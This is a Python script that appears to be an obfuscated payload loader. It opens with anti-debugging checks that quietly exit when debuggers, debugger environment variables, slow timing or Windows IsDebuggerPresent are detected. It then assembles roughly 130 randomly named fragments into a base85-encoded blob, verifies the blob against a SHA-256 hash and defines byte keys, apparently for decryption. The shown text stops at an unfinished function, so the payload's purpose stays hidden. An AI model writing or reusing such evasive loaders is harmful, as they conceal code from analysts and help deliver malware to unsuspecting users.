#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cmaepok4qN3aJf = 'qoYUWP@4D*Rf)=Rrln}HYMX7(iz1<0^|;DBH81>Ne1)SwM3;MNo4L`Ya4?SnI78AADCIX_9I=^S_'
_cwHYcL5IEWF6dX = 'U<gwy@Btng@eU7AO%w3p`}dWzi$nL4>)!AAh{_35{T2=k&xrK%p0g$r+{FCRfD+!JLE3daDaKJ#o'
_cxeb18NhT4ZgBo = 'iw`t4JC=`~;f!ihV8*1+rCb*3M^3pUD=}K9$`tEY{$GAZy8DtC64ESVWI$XDQY3rGuG@x#)d2KTm'
_cnNq7Sa5f_FQww = 'VY=%?3g?f5=!5rq3h{-^z-*&@kilP)`oXMMKGN4K}w@}i-5eH7Y!*0rd*cv`}@LIB2S0V5XHH{-Y'
_ceFnjjdWOYTI4v = 'oYIJEPl!a{*SCBLZ>lYidXKn(RHQyd}D$JjdLQe@RbzVjXv8gfFy`}nxT_Hy^C+?tF^VBX~+4<7?'
_ch6L2Sz0UxxnhB = ')Ggk@+J%RwrG|y?eQJW{xC$D`$S0b86pXsgK1Mak#E)SLb};sVw;&igQ)RH!dm_UYRcghHfn6&kK'
_ckjdgGaUYmiJ_0 = 'idy4wdpOQBlpn)si|rWo*G6$m)V_kMluqQ4ersi7jmr7&FXCyJwOAlf&yczst-(oQdz>`-rqvB5V'
_clHYcUXVMUxi9M = 'rTc`EFF`rm)m9kiTMH$4>-1Z0L$cP)g0X2SYa%zmthxkSO@y`)-=8UyAoU0owh*W$Cu-#UgW@_d!'
_ciQFPujv1Z6pnQ = 'qUw98lS1isg({9)JY)CR1$M&lGz>G@7TF-ouvG+ol-8Y?G|yC9m2Oma`9E)kNOTXuxBmSM9Nr9mg'
_cyvsP0MfsrRWBx = 'Ky-XH18G7VE_&D>RIKJ$ogK#j*YQg5iY=nVJ4Floj$~@(EG>VJaRs5T?3$Fxut%7Nt`zt0?s=c{d'
_cqfzoilojPa1al = '+O1QFuG_C9>EL(DcIW8#t@zzAcogM2Mc|bz%NL2u*OF!uzA#o6`2ie@@FTU|U3bPli-8_>qny&x6'
_cd1IlySO428cGA = '@T$c_wHwaB8#0c@jwR%m?fe##x^96EU~Vm?lSwE*|O3Vg|ze+c)JGLF3lz{8@nDCL9hp49jo}50g'
_cq9a4dAdNxyGax = '5jUrB=Eb4Hlz6{WGCs5lv++9`c?n<x1FOmi8dJ6)oeGs@-X{^ac|2;XO$}R%XVTprrbJYzHDIYq;'
_cl5DgXNGGOwPNt = 'XeZhLA}zA+){i?__0WbqhHnov^1hb?J;X}xvdF(oXix`9mr^F7$Zf>4|*D%yKzzt-ELD@vulWQq~'
_cnYZEKG0Lvj3ql = 'U5a0t|{{K0iumj&jAr$^ecf%RHR3b&209yE|%bKiblz@|0?Z3={=HolAO4`lMp?)~K$zGE!OX~8D'
_cgGJdciJv2DYBs = 'TlF8uFIit|1Bqi-l7f-XBChDY<YcTLCd`|(@rY%%y#WYMe2o+aZkLuFZ|QMdjQ+0JZ?AHjqpqnU='
_cubzVDGYL0m63g = '{-+e2FBJS<!cgyAXJh{d-i1piVBoxb}c6W@Z#4NL#(wHJqYHu_;QZw^@`6yd&G264@Ia=S1#SKsS'
_crFV2na6uyOMVw = '2ilWto(7F4;J}!45)uN?DeN<<`oheYXETO8t#0>nFN$`#Tw}bhNXWFa-q~q4updRl1grRhiaTIn+'
_cz8KAwTZPNdxVN = '3aTlD%B-Qduyr0I>t>1dCJS(vMV0q!u`bpTE3&F*I?l6Ff{%7mw^o@joF?^w~?8+D%2-UZ?O2&zF'
_csHm9XwtviI1X_ = 'D+{l3arW%%yke>BKHTcS)nW~Z${s@~C=G=xHz9)u;bV2Jdud)>Gc|sn5H;)HaBbe4TI0b2wr-?Y9'
_cfmkQCouqrbXJy = '<5F{Sv(PB0Ol-G#?5l?I(})2*so`_8+G`X+%PF;nB)Cf@N`n!_gh5DhGP`ac3xVpHWr;k$D0|DJ%'
_cdmE1tM1ox0p3X = 'Hw^P{9~!uDh8<&$vQ$Wu(7$vEli~4Sr_B$ybr`vODo=SYPs)ui4enes-~);Q>0mu3eXtC0j6G3jR'
_cyUiZjI8hUFz1C = '}%U<KKvn-}YmQUQ;~gnVm18#r$yg&WT)r{t8=_!Syvt`dB&x7PPuJ3)>aSld1o@-Vz5;4#cEb#5j'
_cqKoZB8bMPyHte = 'x~yUL-LX*sZlZ)k)C^N^7s;E)%x0+dYb#lcj#==SQmiJ3jCRcHY_);p9Uk>aVd09*AubX6_<f54A'
_cqILOz9L8TkaGb = '_=p4rj;0IB{4oN&=p@v@`7|UF^GYfr(Q%Z#y8T$0HQbJ7HZq-UGl=+eDkynDfQ}E86B&s)K2}3sZ'
_czX8OtoJHz_WRA = '$H0ZKZ#P&RIPHTVkJ3!mn|>MXkmC-<Pv+?EHyn<&_C*w5;DBjPdSBIsQw0@mMBJiHJ@B=zpKezeP'
_cgBIN1Z9p2VQnq = 'sF#{>h?<GbOXts>F@isCuGS6oKZU=c;(jfPj9S?<<Svt{qd#}OxS7fqjOy^Vs>sUm%G71SuMRa=E'
_cqQZZPuYpkztZn = 'nh1Uo7oRrx^)|<g-T<Q#%#dbxf~%bLvVV7k8VuN!1$0MUm(+G<nMZ*mw60^p1lJKBkSc`Y7k#p7W'
_czmC9IWijTB8cJ = 'gdY6h)XSdjLn2CORIhY~NyLlzA(bvqC?z1licu>MgPB{Wewy?VoJ5^4WwWR_7`xcU+l<}j~f#5S9'
_cshs6q0SjZbeRV = 'Z_(HcjZSz9qYvGy|mo(Uh$rj5xK#nH35+k`h(pS}(?V>r(bFC}PT!kbSxGst##5%lZ4Us)ITk$6v'
_coVgZ5fucKXYzT = 'J9IQnv|6ao+b?>2su~6+JV8h^(-Xkv)uaESW*(8@S2`jl<~cEhz9h*qtU*DGY7QxkI&yR)4+3{5!'
_cxogwH98t__o5F = 'aFN(gje>(XXge?@9)M$X-X5<gK*kds+kU4d+d(<=a7;pniWbMkYncZ`s_7`1%~;#HKXlOJ-Zn5%O'
_cbcrLLeawHjY6C = 'E%iY&?T+HZ3z#c6s&haQqKD5hr|Ax><(3Kx!hqQx8K4UIf7{s|Qt-!4@OccUBA@3uN1)0OU9vFc$'
_cjkdoMqdJw1E9k = 'kG%qo{RcJAw8{g1&VpAGiMvsE)3azg7#Pt=!uA!N+GNroiM$-LVicrwo8vcH(|6n3+%HHwxStW4('
_ctH5O8u6hWdu4f = '31wJiWGe^m1Mm1_Am<mkk>U5~GG(QBqekwtP_o$q$uI<V((j%EWQhkTHw<!Bq`t|GvXm$S1-lRl_'
_ceiFIJzq50Rfxb = 'rm62Fcxhmq2-?|;IpbW$SyqVW?vivy(c+u;FqkG4V*~7W^U1OmemR;J#yybwE`&1GD3^XsMN`mO7'
_cvxnoRnaKSkPtE = '|%*bbp0eIe&wWfzK`UOj8ANWPUlL)51BXhVM&(3@g4j0T?guZ&Pc@+OH4To96j$vh$2Z5SWA#F?D'
_cq01zuxGfYkCvA = 'CNc?Qrsc1pq@)Xj6!M$IYRSTP?duraViPMbH8?5Nmhu#MqRNp;(6VUX68~Ew4jWmDQ!hge3Q6;pa'
_cs22HYMqUBmjOl = 'a19t`6mHf!XZiLYLAPNt#&x8I<2HDU-wtF)rhW;J=>m{<Q{*m#2z&%PngY>Pxq)6J!h?JbdU!(Fy'
_cavoIUdibBg1GL = 'aD&Gg@QZU95x@Y4iwMC!KQMH?}wKZatA2K7l+B;KN@A<Rq_nn!HvImGxM*wFlh}Iw7OXKwqj8oxY'
_cmDhO_DxvVpcD4 = 'i!oje|7A5nLN>uO;2p}%5bV}+G63m^wBl;~`r7M2L*KN;64=Yj#;g>@>1aDJI=a+Q#jxN16YcLG1'
_cgzZmdIr3MoCZj = 'A6g?v`+}ZOXB|12)#Qae~fg!cnZ%}p>$ougE-1=_YPGluPS8adpNU8Ei#Vw*CmD?PN^8_vC2pX8p'
_cq3KRBj1jxnHEB = 'qcM(!zM$2UWaCEfH~NUD92IYfyl9nJuHIC?1jo5tk*7{KcBpf|C4MI642l;VU&S-@?O507COf*XB'
_cgISVnO3BXlD4A = 'bReU&H~ucAew-Jl)rvymcHV=HwO1ZK8G&Y%MFQTd6_s}xWEGUuF1pCig?GSM$hr@K{V+$Qp@J|F*'
_chC4fvlYeHj1Ro = '%hXTzzdQ52ZUY7k>qX3HyDI&=$g2DPm{tpXH&8JpSI~Ql@>?C?BoIF)4oTBn3=aTWe!l!Fz`K|H{'
_czHxZHGKVM0_qP = '(f891tAMZ%ZFM##9+7!GhbGiQs&TVZui3k7&0~g8NK(zQbLH$j&YB+}g^+fPHa-r$y!NhNBZoA>I'
_cmWYzN3q92xe00 = '(C8fZMEQ^6uD7S1#pL&BbhdyTA99hNzU#d8_(DKwKkV!jY?+mNtQ|&&S*=~0%z5FP(0OMGhB@oK='
_ca7yHEYBeBqzZm = 'B{p37a0!tE;d<`^)At>L&DP1l7kTbvw`M0Ts_HHDp}%1juUbrqT#jo4kZgMJ21<ZB_jsQ03nDFK$'
_cuOIEuR11ICEKo = ';_C)u_+{}8^m&LaROoKL#8WcOm928V+YW-J=p87@BE36Ts#c-=rw6lmtqcixW$QzMTquHQoDz5~*'
_cfyboABZryAzge = 'CXOWR1)5%;Z`siLNot05`VzR8?kAxw6FwQ6fc0lByNqT9Ag1)f?x=tGGE@g{+^Tr{`<Zt##!+I17'
_chEg5J5uVsXXxo = 'Yk(>ckuV^-Dj#&v{|_O(0Cm2Sg?jAqQe45KYCB3%Qp1oKAswQ|uy_yUToVnRZV6TKd^n)N8!<F}k'
_cclgbg1AdJNrar = 'Rb}OESFTYKQ5zQA4IW|P9H3Fr7m-)p#R1ImXv^nU0XjOO=c}De+$VlywAWtD58#g4`vqYD`M{Y+n'
_crDI43Y5n2cqMk = 'nLF7&(dn>(YqP?<v;wP8Up|<008+g@pO74|asbZ{V&f&&sLo{czJepal7poaEk@2@A6EDxNSK*l1'
_ckp5lJPr0DLq4v = '=G+vd%^hlceJ=GfHlpLPMVa`4Avc4fNTC24EdT`6Vi^1oaGzwYNq6@gkA4!z%h(6UD$(R*d0MC}I'
_czVYp2PoiscONd = '`tqjvLM*j7mZAA*ig0YzKZ$q$lOF%lKl1jNIBay=SiR5a>_NqGL^YwcC#t&s`OGti{{j}%eeOIJy'
_cmh8AaMs8z8WpP = 'S-iSeG0u==KOnUM5v?K$2tqusoO$tf*9NV^XG1XS^kY{RTS6y<Kym*glH(BnJ!dB3xxZ-hxqPNkx'
_crxEPnwunU4qVy = 'd=?^pz=<1MlRC1&h|DVYJwLf98@i5Dxo)5^-tQ}&z^wXb6cRd-o`<LdyIo6G3>6Z@SnaJY}g`}HB'
_c_runZEBYPjPJv = 'tHYZeS&+y;5u{Ekr{#j$)(?X$C_8^jGYh>aI}gkCmv*s%A&pFTE<;u}?^LjUy(#vL7=a33a*F91U'
_cdsqptBnlXaRIL = 'KCF)!;#OxGBZY%Un#uKghSfvVPpk2dHeDvB}$w6^qnCzFluFINp8>*{EPfmKNrKYuj2?heeGkl1f'
_ctThSBowX9G1G3 = '*CmT}W9#D|tEIfsKE)jxY6HwEbyZ70gqA8=&O>wmYxF&X>c>C1isI@P&=l)->r#;sJLBliEynu5n'
_cnHRfTmMiuE4US = 'yF=ibN-}z+)~V8@pL7(WW{J&g{_?R$9-qFR*(VQDOFQlAe~CxmM3^&#rqriHFfiE0c@83q9y2(}s'
_cnhudlPyFyG8gL = 'kU`c1(sntMkAC`Gz!FZox%$aNygBPE-L1Mp3*B?aAluMqR`C9*`BXC3>sN4VeA+}vV2)Bxt%O^*S'
_clG8blyCDmSzrP = '*aIX@vmoePXstDlBL@G}2e>D<KW!`n>Q9dJCH=%RqIi<U;%$O@1y5;in;GFo+ncGo$EqZmVrE8dy'
_cynDXcxzD9h1mO = '^>8NSMSqqfT#NS4>H-Z`n6y!~7Tm?XT>xjjh`JXl}kVo^76eGD~*<KC8WolulN;Q}a1oXpN|{g_U'
_cboFULRqZeN84b = 'A68e5Na3l}Wfvf7`M)2K1jC#kxUfR4NBVtjph;5Q{kFrRMW3=<S|BG<5Edqi=gZa!iV?r$bC6`UA'
_czel8Od3PyFiLi = 'KuykFb*?^inB=db=n&;eX(%uFJj+w&;HW_kBTfvMfTB&WpCJ`k2%w?~noiei<O8{On4LeUYh}AAb'
_c_BbjJqVc8MBx1 = 'W}x|(#=endpE0Od@h1zu4e{23DjEm@W|WQ?s}MTyG9JthFXA$M4_!pgq5aWx*UONb(Yjkv@i5<-~'
_crfaYIWeeCwEK4 = '@c=QuMv~h+)H@!memt8!BMct&q<i7N4n0+IWAS4lc<N4!H0qeN0d55O9`gQhB2b4Iv<ZXwPG<yud'
_czzXadptkYG0a0 = '9WyzPsU)dpq8<PJ}mDAZ0Yw?NGul%KRn0V2o?cOKp(;hNdWm#@aT+M~q(awYP(2}eE^dMN$>_oA4'
_cajzctUjwLPegW = 'Pb*RAd7J-iORH1?s1NUGVDt@u1LXD`82Ev?^?5_x|>+ljBAGW0c>`08;EMl~q9>T-OikOv+dg6V|'
_ckcLu8qoIDcMmz = 'aDW3Kmy9W1g~bf@F43o!JeIPCD~$mpwO2mp#ln@V_&a(eG4?u}SSyMU)sgYcFzxgk2aM&i-u>ovf'
_csPGKeBuZj7fk9 = 'Mq%kWjWl`B?he^4f{+Xk#K6>4ht5`8c`O?WT=)Z;tCQ>00xG+l<J;>&SG#r)bm6GL`<daPsKk`L{'
_c_rXwRisWrDFAQ = 'A<4H7<d~Fc`9{9*~zKgHw`rx51N|ul5o)Kz+J{&y*@54rUV*e0gg-$};YB-VgHRL91V0Bin%vrB1'
_ch9A0lnG3VLn6m = 'ezW`j%lQQ%kKaJQ>=e`6_f*r#RF9ion`8dPz>qv>EP-s~*Et!{iitfu3g3IyS$*zKaJf1~-Cv+dQ'
_cxctp4sqJn66Wc = '!Q5FhLtbBktL_tXCPUA7(8Bz|>Ym?3>ok&}|Dw{0}wJn_8wkWg;t{VCfGwdgWk;1lD+OzXn|Mvak'
_clRBcMCtwf_R7i = 'A~A^~bh!UHUF2KI6oMKsRYKJE=Lq$c7s#v?0etEw^B`#=;1fvF@lRChY<%Q|_ku#?KH?n#v?`tDi'
_cp4cEJi51i0b7v = 'R#PgHctWDd7Ii!gJ+}c(t%gW|5<Vx%`M1QdC@e(8ZPoTJsfjh4H$2)*)Dfm3-$9+0)(iyFTXoF@#'
_cuxtAayrdjkbXj = 'Gx%&bjkcuhB=Nk<IWS%(20b5!?c+iCH)~(xb})4T*g=Ou+R9k6oG}G!pdOdG!iFFA^>)LBO?*oj^'
_cnjv1VMudFeWs1 = '+`g`#+~U;yPN-=-@tlSAUq@$0GqUq}q1Ou}#S5ub2krRs|!6DHf1fP;2-W@FNPIa*S7-|<-?{M7P'
_capoh3w1UWdSYH = 'gLD@cXv}{m|E|Oge3>&ri^Lj&fjkkgOeywQr-`hf~@AmR3d?V*7X1eiM0PMfy+zh+f$}WbB7;d&0'
_c_zk5kDoLzWFoW = 'mZ*Yp3@IaGl0jpxNfaNw1>lr7mtcRs$wE)Nv&)7<1uOo@ZcHgeZlib>VzP(XW9Bw0Bqc95+Rl3b)'
_cjs7r2PysBAEv9 = 'GmiAjTWifij5}w-gPzFdZas@1g{vsnh%`R9fYOKdBATihyiqMDzcr?oU@>^bqP&oj3dU=oa$5iu?'
_cdXf0ROO2RyShU = '*BqjP~ggRb|KfEAE2_EccTJfUQ@%lpROdo=w@Ss>8}5K(Re{8B7cK_0_jSS^?33jIosxgw`eXQkU'
_cnA8cCwiMRqOcu = 'bxojOHv)l)$k6bf2v2pN1)n(yq+em>j`=(WwZBti=r?~RTlQ!#8g86fAn1G7gj#pCZQ0<?L@)dRb'
_ctVnXQneE3ZQ68 = 'JLICIsj<fkvYp)^mz(UyoZp%fojWwbK;3o7V9Z8msx#Ny`*$b<Ou)c6M3HG%SRf-3IE|S1v?!;KF'
_csTTyXpA0qsiaE = 'toJe?no)?uv84c`5|lbEKaC4Rw<JeMp(`4S={GQh5g+*oM~GJ3PXw^7BL+NKCf;fBm05xZTw9z?W'
_cuQ6NkyHK6qWk5 = 'UFP1p`6PO?p4KO)A!^exI|$vj1d;*-{g=@No{sOw^((qjIO{Z(i<f1i4O@UajfOcg$n@P7=_l_!H'
_cj62fjnPHqtwRF = 'W#qn{0xDKrgcS$uQ&xSjo|0OeHbbaN=O~VWQ=c6A~A%q~EOxyz{ZL-`Gkd^@EP-H?-_^O2^>&#DI'
_ciEFiffAoNA5ag = 'vtk2SN=F^bc6<ww0Km98xt3uV&vky6fDu~Z9}#s7)1gHr1%&%PNvXZ@MtMH}m%y_bE3T<#zI>xzr'
_cmXLJrHurN1ibd = 'dnCCE1H(@3+mrgJdLzAK=PVH^W08@z0h7{>Fol-U!&L|GDJkJ#9I0DmhM(5~wu{BTGmfuVKL~GMn'
_c_r84XFECDUAgk = '1Jev;%~Oy$KT4$548#O9gjgXnc_Vlq)&pS<zcJc*9@3N#6Q-HS=1w$mJbIU@O3v{<qbt1#xeWUQM'
_cyVZ7Y4FogVhRv = 'kJ6emnWbkibNX}qBN|e4f*);W&=loikf?%E4nId`xEmFHe~JEp8b0a(6;q#X-1_~8q9BmyINC)67'
_cbmkhlGlUs3GFS = 'f};)8qhI-ieMg7Ka_FBLd`RDqR0VJXkLVdw@*zW`u@<$Jl@kS(x*WLE7K^#N=ETdRdck7@yk1+eb'
_cjGJN3iNfMldLE = '$=@(`bw5uE@pxehYow^v2~8|G35#Q+(Q<PONYgDfHv+2!J(E-VFzlOC(PLzn^gc$7fa?Y!8dWgMP'
_csrbM8r507Eqtu = 'M(2V6Ygn-7XuEvWk;Yb}xvOM?&qC4N^-1+DYp@s{QZgx(xiwZb&k#`V&4AGs{BtOzY=Ck*$opT^x'
_cocU07UHgbd3Bz = '(rIb~#YM#<k4xYN0hSSOP2Bh-t23H3z(Ht-;Eh}IRg8phEVu+8Tb7BG^hZj-T*Fgo95KNPK`UrTP'
_cbD_yfsBKcboH9 = 'fLO}1j`4j3TOn-6%#hDNio~e0klDtdAE}WXt9C_FU{)`2Q5M$%l(*;nnTpmY!Q}Eia&&t6aA5<`('
_cbfHdGVDI1ZjIa = 'UiYR6FbHz8n<Oo2;^}xIO`p(zti-3@;!M!mntVfo9xZYpz@c0K4aOi@r#GN!Thk{3YZh-zu(GFfy'
_cm6jfE9D5jnHCn = 'iP6N^6v316{=3BwWK1ro0uV<8wXpT?eyt~)$mh@u6wa^CF9KaefW*t36UfTy5xafR+JuHpCMBo*E'
_cn_b_L9vJo_iZS = 'C(7vA9`e3O@9@2bNNNGh98hbUqza7!2d2pvUL>;0-*b!JzFa>rhX>1|(vJr_H@6Y#WmKV+39hYK)'
_cjwC1Zl3Joj6wr = '(9wuz$$eRJveG#wt%CPs>&pKag@iBK<gt~3i2tKI4Bfh_gjVm-(U$**iYCFGRytQbbXhL34vCN60'
_cpqTqdJBT8exaM = ')DAi00W{Yi7G?FWG=Ai&B3Y?FB`!;r}2)hCL%M&0RUklxVWyq4D7{O4;^MGnIH{l*mR+=m2===ai'
_cd2LUxamLbJl8G = '3<0S>Yg^;Y;e>R(^ZGt6ru>$7+|qqQ@IQpzpWj$ALDK$3zOtECazXwT|lKp|8m^okyp1t1ZU^1D<'
_cpruOgCRsbffJo = 'AZm(Wr?t91P^kJAvoQ?XS})(EKFsbIIH1>{&%p!4&$jQW*_C7oyPdb5qbnJ7JX)jnC&QmMrJm@UP'
_cv9TXtofq83yj_ = 'lr|sWF0T@-9h*-(I8eeH8P!L?wkxE*F3$gmxTe9P`h<ohQ(>tyiSTm#{nS8b=w%fg-82B<?opBm4'
_cpomcS1TpKlCZp = 'F%=G81Qn2|)XVL1F$n&$RSs7>=4$d5r^O+NFgoRlbO)ifPu^1%FH(qFF5lCA(z=wh4~e`NK$EM4O'
_cmez7QhNUaVxQz = '`L>ehb<$dOi?n}A0t5a{SjjNDkY$WpLm;FBXgG5To<;&Df!^P(y4DrkX?}tPU*mi1UYs<Jb$$15N'
_cj48C8ardZPW8S = 'Ew+vp2;(TzO-U^Y-|l=`C4(*axa1wGBu`;l)`2%n5g+fsoBQw;xxzTrR6LDCX@yg}<Zj?a{dj^DD'
_cyFyfQ_UK_TwJf = 'U#Hk6_nesh9g`T7>Vyx|Hgb1SIx6fRNSR!+~m>)c(6I>p8`Ac~sQz+acn&XBr<jeVQ>66x3U;t&m'
_cutKAeGiNKvpyh = 'StIztJKYg8q=6jSo9=F#H?u6wNdTB8`tl<<4McU1^Rtc|E72!0*g?Deis=xJ=f$W`CgSn{(2}1va'
_chyzAFU2wLE7qu = 'gjP!K0TtdmN3jRka%TT|76wfj_9)s>O16#9&X8PlBsbCcW9hhjD+8@(OShgSemN-uV|#)F7bXzB4'
_cgswNi4ibx7jBS = 'tAFM7lB7Ds$syUw4g}zCzrm4Q@w(h?7Zva>TvNaB8F>dVx_xfkV0Dc5<-X`QjgUWbZgJJ7@HWmVX'
_c_iheamfSqzxwZ = '2(bf5k=6C=P_?d+*29Jlvh67c=86b|(@&${}Zpsu|YqE^sAC>ikY+s{yyG5;!CGSnp!?o$d7_lp5'
_cruwBW65A3RYdC = 'o!i78QnawNnYWg;bqM=cU3Ce0(C;NauC#j6t+f_L#)N3qBA=RNL^5D4`Itzw6#O3kQD1A|i_?^69'
_ctUE7oqbRZIVVq = 'e^fO|BbSl@a9v-pZ?3&N^kHGIf26Xg&iX(UPg}+)NSW>d+)Kz&jtz}A9gLkm*_*e%(I%#eTZ$%-$'
_cdIh8Yr7CzzEyW = '8Fo1#lN_9Jaw_*av%IFfWsz8&PsqPkXRHW<CRJW#z%jH5>S-n3cNo8W#u%#qe`EJweMB4lBEqRp#'
_ch1t8RSW_hiSpv = '3+G*IO$w3eo(ISu8S8~+ur5|_JK=&W<nd+>3WJ<Orvb59n~%R!Q8I`eH|5^zW+tnW+nG~JTcCB8j'
_ccIDxqb7O5yg2F = '(tKd&V&y<P(osS-SMR(WB7?qu>BZW^G(J*jfc<CzCq{Ob&TcoKqyT{@RzvoVF)v;5E1R_|no>RVM'
_cbS7n0vCzGZ0bc = ')g^H8w(R?GtXcK|Fn!^W`<?QG}0Tz3U^ZNX}^Z7)Uoe^TvK@%a<_o3njHv#`+X58o!=G@%=C=B&5'
_cxEcxoplFgxls5 = 'Co07KA5v+PR;D?*lAWzcMXrCi7gIuOurtH4OGO$Vi*p}szs37(<-mGr`xC!o!+Kuu8$Qj(+^`PO='
_cp69hBjBC7Uxdb = 'Wvt6nA-#HA^^oh#+e+aYCF-xCI0mIlkW{Kvwraz#@0>Xd_Fr7-YV&t9pl&ZSkxrPmO$4~!%B@LXX'
_ccB8OTo1lVz502 = 'V_?Fhwcu;P@YI@W=%qGw#mfmNfbCJMb>izOoYRp#G<Aovp{cpSqG%FO=}+bL2(JlZ&R;LfMx88wa'
_cpIN13YxyIdcZV = '*?5=P6sjjXY;5Oi@3Mz^}&BJp+uy{<t%_>al1CP<xq?c5HnYqMrJpzf8_S#tuN|wRInu8KsQfFS2'
_cif6KCUrvPhw8v = '=BLXU9^F6o;<2(D_zPs_bb_@Bi*v~`-LfnZaKSA_GlLW1<7K6qCEvZarNX6{5M*`_PljC65Aw(Jt'
_cokKvmC5ioryYa = 'm)|ZrV1-uJSnFmv7T6bFO>FA3`@Z+n&*(cC#>;Uu+NeB?wdq|aMFr?u(`XoN4|F&cTVj~|7oNv@A'
_clxvULJVfnrCzQ = 'DbBq<<Efgw0Q?DRsUWtH`Sdgk&bXgn(ZN+js6KSr7I1gNA>^X_dL^%tOSGa~Ci+q$L)`Z$(@sF1Z'
_cglCOgj07D6OL5 = '4{w5E2D~`b_fJA#9z}NqhnpZbprC<pG)XGkGNMs4;LZ=fR*DTM+c#kK*0aouT!3}r7DO3P`__<iG'
_cyhgHLr22ViGF9 = 'c#89byPE<v9cc$o5ocUR>Lq99Z?ScHheab8|3bx_Scb`2'

_pt5K1S1hjfZO2G = __import__('base64').b85decode(_cmaepok4qN3aJf + _cwHYcL5IEWF6dX + _cxeb18NhT4ZgBo + _cnNq7Sa5f_FQww + _ceFnjjdWOYTI4v + _ch6L2Sz0UxxnhB + _ckjdgGaUYmiJ_0 + _clHYcUXVMUxi9M + _ciQFPujv1Z6pnQ + _cyvsP0MfsrRWBx + _cqfzoilojPa1al + _cd1IlySO428cGA + _cq9a4dAdNxyGax + _cl5DgXNGGOwPNt + _cnYZEKG0Lvj3ql + _cgGJdciJv2DYBs + _cubzVDGYL0m63g + _crFV2na6uyOMVw + _cz8KAwTZPNdxVN + _csHm9XwtviI1X_ + _cfmkQCouqrbXJy + _cdmE1tM1ox0p3X + _cyUiZjI8hUFz1C + _cqKoZB8bMPyHte + _cqILOz9L8TkaGb + _czX8OtoJHz_WRA + _cgBIN1Z9p2VQnq + _cqQZZPuYpkztZn + _czmC9IWijTB8cJ + _cshs6q0SjZbeRV + _coVgZ5fucKXYzT + _cxogwH98t__o5F + _cbcrLLeawHjY6C + _cjkdoMqdJw1E9k + _ctH5O8u6hWdu4f + _ceiFIJzq50Rfxb + _cvxnoRnaKSkPtE + _cq01zuxGfYkCvA + _cs22HYMqUBmjOl + _cavoIUdibBg1GL + _cmDhO_DxvVpcD4 + _cgzZmdIr3MoCZj + _cq3KRBj1jxnHEB + _cgISVnO3BXlD4A + _chC4fvlYeHj1Ro + _czHxZHGKVM0_qP + _cmWYzN3q92xe00 + _ca7yHEYBeBqzZm + _cuOIEuR11ICEKo + _cfyboABZryAzge + _chEg5J5uVsXXxo + _cclgbg1AdJNrar + _crDI43Y5n2cqMk + _ckp5lJPr0DLq4v + _czVYp2PoiscONd + _cmh8AaMs8z8WpP + _crxEPnwunU4qVy + _c_runZEBYPjPJv + _cdsqptBnlXaRIL + _ctThSBowX9G1G3 + _cnHRfTmMiuE4US + _cnhudlPyFyG8gL + _clG8blyCDmSzrP + _cynDXcxzD9h1mO + _cboFULRqZeN84b + _czel8Od3PyFiLi + _c_BbjJqVc8MBx1 + _crfaYIWeeCwEK4 + _czzXadptkYG0a0 + _cajzctUjwLPegW + _ckcLu8qoIDcMmz + _csPGKeBuZj7fk9 + _c_rXwRisWrDFAQ + _ch9A0lnG3VLn6m + _cxctp4sqJn66Wc + _clRBcMCtwf_R7i + _cp4cEJi51i0b7v + _cuxtAayrdjkbXj + _cnjv1VMudFeWs1 + _capoh3w1UWdSYH + _c_zk5kDoLzWFoW + _cjs7r2PysBAEv9 + _cdXf0ROO2RyShU + _cnA8cCwiMRqOcu + _ctVnXQneE3ZQ68 + _csTTyXpA0qsiaE + _cuQ6NkyHK6qWk5 + _cj62fjnPHqtwRF + _ciEFiffAoNA5ag + _cmXLJrHurN1ibd + _c_r84XFECDUAgk + _cyVZ7Y4FogVhRv + _cbmkhlGlUs3GFS + _cjGJN3iNfMldLE + _csrbM8r507Eqtu + _cocU07UHgbd3Bz + _cbD_yfsBKcboH9 + _cbfHdGVDI1ZjIa + _cm6jfE9D5jnHCn + _cn_b_L9vJo_iZS + _cjwC1Zl3Joj6wr + _cpqTqdJBT8exaM + _cd2LUxamLbJl8G + _cpruOgCRsbffJo + _cv9TXtofq83yj_ + _cpomcS1TpKlCZp + _cmez7QhNUaVxQz + _cj48C8ardZPW8S + _cyFyfQ_UK_TwJf + _cutKAeGiNKvpyh + _chyzAFU2wLE7qu + _cgswNi4ibx7jBS + _c_iheamfSqzxwZ + _cruwBW65A3RYdC + _ctUE7oqbRZIVVq + _cdIh8Yr7CzzEyW + _ch1t8RSW_hiSpv + _ccIDxqb7O5yg2F + _cbS7n0vCzGZ0bc + _cxEcxoplFgxls5 + _cp69hBjBC7Uxdb + _ccB8OTo1lVz502 + _cpIN13YxyIdcZV + _cif6KCUrvPhw8v + _cokKvmC5ioryYa + _clxvULJVfnrCzQ + _cglCOgj07D6OL5 + _cyhgHLr22ViGF9)
if __import__('hashlib').sha256(_pt5K1S1hjfZO2G).hexdigest() != '752e260ffbc94f41a7467b32262295a3202fe1479a20241597f912eccb456a48':
    __import__('sys').exit(1)
_xwW2cyRXwwu_gY = bytes([219, 121, 194, 156, 185, 32, 90, 196, 231, 127, 53, 203, 172, 152, 102, 84, 58, 77, 107, 203, 15, 84, 229, 30, 132, 254])
_fkpm6yz9uwYx8BR = bytes([167, 32, 10, 189, 238, 150, 18, 245, 204, 150, 128, 18, 163, 105, 156, 144, 54, 219, 251, 197, 33, 121, 20, 128, 168, 132])

def _fxz7BETs9hNBfMg(_bm60UmirhtyPiy, _kaGwXnvcdYToAM):
